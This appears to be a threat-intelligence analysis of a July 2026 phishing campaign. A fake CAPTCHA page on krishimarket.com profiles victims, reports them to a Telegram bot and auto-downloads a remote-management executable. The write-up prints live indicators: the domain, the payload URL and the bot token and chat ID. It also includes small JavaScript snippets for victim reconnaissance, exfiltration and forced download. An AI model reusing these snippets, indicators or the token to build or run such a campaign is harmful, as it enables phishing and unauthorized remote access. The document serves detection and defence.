# Website Analysis

## Executive Summary

On 3 July 2026, a phishing email was sent with a link to malicious infrastructure hosted on `krishimarket.com` that masquerades as an RSVP verification page for an event invitation. The site used a fake CAPTCHA interface to appear more real that when clicked, gathered victim metadata and delivering a remote administration payload.

Unlike earlier campaign infrastructure associated with credential harvesting activity, this iteration focused on acquiring control of endpoints. User interaction with the fake CAPTCHA initiated background reconnaissance, transmited victim information to an attacker-controlled Telegram channel, and automatically downloaded a Windows executable hosted on Cloudflare R2 object storage.

The campaign demonstrates a combination of social engineering, cloud-hosted delivery infrastructure, victim profiling, and LOLRMM (Living off the Land Remote Monitoring and Management) tactics.

---

# Campaign Overview

## Primary Infrastructure

### Domain

```text
krishimarket.com
```

### Initial Access URL

```text
https://krishimarket.com/rsvp/invitation/captcha.html
```

### Download Staging Infrastructure

```text
pub-626480847b854b77889f6730d12642ee.r2.dev
```

### Exfiltration Infrastructure

```text
api.telegram.org
```

---

# Attack Flow

## Phase 1 – Social Engineering

Victims are presented with what appears to be a CAPTCHA verification page associated with an event RSVP process.

The CAPTCHA is entirely fake and does not use any CAPTCHA validation services. Instead, it functions as a trigger that starts the reconnaissance payload delivery process.

The design relies on user trust and familiarity with CAPTCHA interfaces to encourage interaction.

---

## Phase 2 – Victim Reconnaissance

Upon interaction with the fake CAPTCHA checkbox, the page executes asynchronous JavaScript designed to gather basic victim intelligence.

### Data Collected

- Public IP Address
- City
- Country
- Internet Service Provider (ISP)

### Services Utilized

```text
https://api64.ipify.org
https://ipinfo.io
```

### Example Collection Logic

```javascript
const ipRes = await fetch('https://api64.ipify.org?format=json');
const ipData = await ipRes.json();

const infoRes = await fetch(`https://ipinfo.io/${ip}/json`);
const info = await infoRes.json();
```

This allows the threat actor to identify geographic targeting, victim location, and network ownership before malware execution occurs.

---

## Phase 3 – Telegram Notification

After collecting victim information, the page formats and transmits the data to an attacker-controlled Telegram bot.

### Example Exfiltration Message

```text
🎯 Download Victim!
🌐 IP: x.x.x.x
🏙️ City: Example City
🌎 Country: US
📡 ISP: Example ISP
```

### Exfiltration Mechanism

```javascript
https://api.telegram.org/bot<TOKEN>/sendMessage
```

### Observed Bot Information

```text
Bot Token:
8892723652:AAHzlqOzjviiYXE08ygioj7N1WdZ1prdRNg

Chat ID:
7683234319
```

This provides immediate operational awareness whenever a victim reaches the payload delivery stage.

---

## Phase 4 – Payload Delivery

Following a short delay intended to simulate CAPTCHA processing activity, victims are redirected to a secondary page.

### Redirect Target

```text
dload.html
```

The page automatically initiates a browser download using a dynamically generated anchor element.

### Download Source

```text
https://pub-626480847b854b77889f6730d12642ee.r2.dev/
VIP_INVITATION_E_CARD_rmm_v2_5_0_67_oidca3c87b7_a585_4f32_8343_6ca8a8aade3a.exe
```

### Delivery Mechanism

```javascript
const link = document.createElement('a');
link.href = fileUrl;
document.body.appendChild(link);
link.click();
document.body.removeChild(link);
```

---

# Technical Assessment

## Browser Behavior

No browser exploitation or vulnerability abuse was identified.

The workflow relies entirely on:

- User interaction
- Social engineering
- Automatic download initiation
- Legitimate cloud hosting services

---

## Operational Objectives

The infrastructure appears designed to:

1. Validate victim interaction.
2. Collect victim network metadata.
3. Notify operators in real time.
4. Deliver a remote administration payload.
5. Enable follow-on access through LOLRMM tooling.

---

# Conclusion

The observed website serves as a social engineering delivery platform designed to acquire victim interaction, collect basic reconnaissance data, and facilitate delivery of a remote administration payload. While no browser exploitation was identified, the combination of victim profiling, operator notification, and LOLRMM payload delivery represents a credible threat capable of enabling unauthorized remote access to victim systems.
